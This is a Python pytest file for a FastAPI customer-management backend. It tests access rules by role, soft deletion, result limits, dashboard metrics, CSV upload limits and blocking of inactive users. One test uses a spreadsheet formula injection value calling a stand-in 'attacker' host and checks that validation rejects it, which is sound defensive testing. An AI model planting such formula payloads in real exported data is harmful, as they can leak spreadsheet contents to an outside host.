import pytest
from fastapi import HTTPException
from pydantic import ValidationError

from app.api.auth import upsert_authenticated_user
from app.api.clientes import _ensure_cliente_access
from app.core.auth import require_role
from app.models.cliente import ClienteCreate
from app.services.dashboard import build_dashboard
from app.services.clientes import (
    MAX_CSV_ROWS,
    create_cliente,
    delete_cliente,
    get_cliente_or_404,
    list_clientes,
    parse_clientes_csv,
)
from app.services.users import list_users


class FakeDocumentSnapshot:
    def __init__(self, document_id, data):
        self.id = document_id
        self._data = data
        self.exists = data is not None

    def to_dict(self):
        return self._data


class FakeDocumentReference:
    def __init__(self, collection, document_id):
        self.collection = collection
        self.document_id = document_id

    def set(self, data):
        self.collection.rows[self.document_id] = data

    def update(self, changes):
        self.collection.rows[self.document_id].update(changes)

    def get(self):
        return FakeDocumentSnapshot(
            self.document_id,
            self.collection.rows.get(self.document_id),
        )

    def delete(self):
        self.collection.rows.pop(self.document_id, None)


class FakeCollection:
    def __init__(self):
        self.rows = {}

    def document(self, document_id):
        return FakeDocumentReference(self, document_id)

    def stream(self):
        return [
            FakeDocumentSnapshot(document_id, data)
            for document_id, data in self.rows.items()
        ]


class FakeDb:
    def __init__(self):
        self.collections = {
            "clientes": FakeCollection(),
            "interacciones": FakeCollection(),
            "oportunidades": FakeCollection(),
            "propuestas": FakeCollection(),
            "users": FakeCollection(),
        }

    def collection(self, name):
        return self.collections[name]


def test_vendedor_cannot_access_cliente_from_another_owner():
    cliente = {"id": "cliente-1", "vendedorUid": "seller-2", "ownerUid": "seller-2"}
    user = {"uid": "seller-1", "rol": "vendedor"}

    with pytest.raises(HTTPException) as exc_info:
        _ensure_cliente_access(cliente, user)

    assert exc_info.value.status_code == 403


def test_supervisor_can_access_any_cliente():
    cliente = {"id": "cliente-1", "vendedorUid": "seller-2", "ownerUid": "seller-2"}
    user = {"uid": "supervisor-1", "rol": "supervisor"}

    _ensure_cliente_access(cliente, user)


def test_delete_cliente_hides_existing_document_without_physical_delete():
    db = FakeDb()
    created = create_cliente(
        db,
        ClienteCreate(
            nombre="Maria Soto",
            empresa="Granja Los Pinos",
            email="maria@lospinos.cl",
            rubro="Cerdos",
            region="Maule",
            vendedorUid="seller-1",
        ),
    )

    delete_cliente(db, created["id"])

    with pytest.raises(HTTPException) as exc_info:
        get_cliente_or_404(db, created["id"])

    assert exc_info.value.status_code == 404
    stored = db.collection("clientes").rows[created["id"]]
    assert stored["estado"] == "Inactivo"
    assert stored["deletedAt"] is not None
    assert list_clientes(db) == []


def test_list_clientes_limits_large_responses():
    db = FakeDb()
    for index in range(105):
        create_cliente(
            db,
            ClienteCreate(
                nombre=f"Cliente {index}",
                empresa=f"Empresa {index}",
                email=f"cliente{index}@encipharm.cl",
                rubro="Cerdos",
                region="Maule",
                vendedorUid="seller-1",
            ),
        )

    assert len(list_clientes(db, limit=10)) == 10


def test_dashboard_counts_all_clients_without_api_limit():
    db = FakeDb()
    for index in range(105):
        create_cliente(
            db,
            ClienteCreate(
                nombre=f"Cliente {index}",
                empresa=f"Empresa {index}",
                email=f"dashboard{index}@encipharm.cl",
                rubro="Aves",
                region="Maule",
                vendedorUid="seller-1",
            ),
        )

    dashboard = build_dashboard(db, vendedor_uid="seller-1")

    assert dashboard["totalClientes"] == 105


def test_dashboard_includes_commercial_metrics():
    db = FakeDb()
    db.collection("oportunidades").document("op-1").set({
        "id": "op-1",
        "clienteId": "cliente-1",
        "titulo": "Oportunidad A",
        "etapa": "cotizacion",
        "valorEstimado": 250000,
        "vendedorUid": "seller-1",
    })
    db.collection("oportunidades").document("op-2").set({
        "id": "op-2",
        "clienteId": "cliente-2",
        "titulo": "Oportunidad B",
        "etapa": "negociacion",
        "valorEstimado": 750000,
        "vendedorUid": "seller-2",
    })
    db.collection("propuestas").document("prop-1").set({
        "id": "prop-1",
        "clienteId": "cliente-1",
        "titulo": "Propuesta A",
        "estado": "aceptada",
        "montoTotal": 90000,
        "vendedorUid": "seller-1",
    })

    dashboard = build_dashboard(db, vendedor_uid="seller-1")

    assert dashboard["totalOportunidades"] == 1
    assert dashboard["valorPipeline"] == 250000
    assert dashboard["totalPropuestas"] == 1
    assert dashboard["valorPropuestasAceptadas"] == 90000
    assert dashboard["oportunidadesPorEtapa"] == [{"clave": "cotizacion", "total": 1}]
    assert dashboard["propuestasPorEstado"] == [{"clave": "aceptada", "total": 1}]


def test_list_users_limits_large_responses():
    db = FakeDb()
    for index in range(105):
        db.collection("users").document(f"user-{index}").set({
            "uid": f"user-{index}",
            "email": f"user{index}@encipharm.cl",
            "nombre": f"User {index}",
            "rol": "vendedor",
            "activo": True,
        })

    assert len(list_users(db, limit=25)) == 25


def test_cliente_rejects_formula_injection_payloads():
    with pytest.raises(ValidationError):
        ClienteCreate(
            nombre="=IMPORTXML(\"http://attacker\")",
            empresa="Empresa",
            email="cliente@encipharm.cl",
            rubro="Cerdos",
            region="Maule",
        )


def test_csv_rejects_invalid_encoding():
    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv(b"\xff\xfe\x00")

    assert exc_info.value.status_code == 400


def test_csv_rejects_oversized_file():
    content = b"nombre,empresa,email\n" + (b"a" * 1_000_001)

    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv(content)

    assert exc_info.value.status_code == 413


def test_csv_rejects_too_many_rows():
    rows = [
        "nombre,empresa,email",
        *[
            f"Cliente {index},Empresa {index},cliente{index}@encipharm.cl"
            for index in range(MAX_CSV_ROWS + 1)
        ],
    ]

    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv("\n".join(rows).encode("utf-8"))

    assert exc_info.value.status_code == 413


@pytest.mark.anyio
async def test_inactive_user_cannot_pass_role_checker(monkeypatch):
    db = FakeDb()
    db.collection("users").document("seller-1").set({
        "uid": "seller-1",
        "email": "seller@encipharm.cl",
        "nombre": "Seller",
        "rol": "vendedor",
        "activo": False,
    })
    monkeypatch.setattr("app.core.auth.get_db", lambda: db)

    checker = require_role("vendedor")
    with pytest.raises(HTTPException) as exc_info:
        await checker({"uid": "seller-1", "rol": "vendedor"})

    assert exc_info.value.status_code == 403


@pytest.mark.anyio
async def test_inactive_user_cannot_login(monkeypatch):
    db = FakeDb()
    db.collection("users").document("seller-1").set({
        "uid": "seller-1",
        "email": "seller@encipharm.cl",
        "nombre": "Seller",
        "rol": "vendedor",
        "activo": False,
    })
    monkeypatch.setattr("app.api.auth.get_db", lambda: db)

    with pytest.raises(HTTPException) as exc_info:
        await upsert_authenticated_user({
            "uid": "seller-1",
            "email": "seller@encipharm.cl",
            "name": "Seller",
        })

    assert exc_info.value.status_code == 403
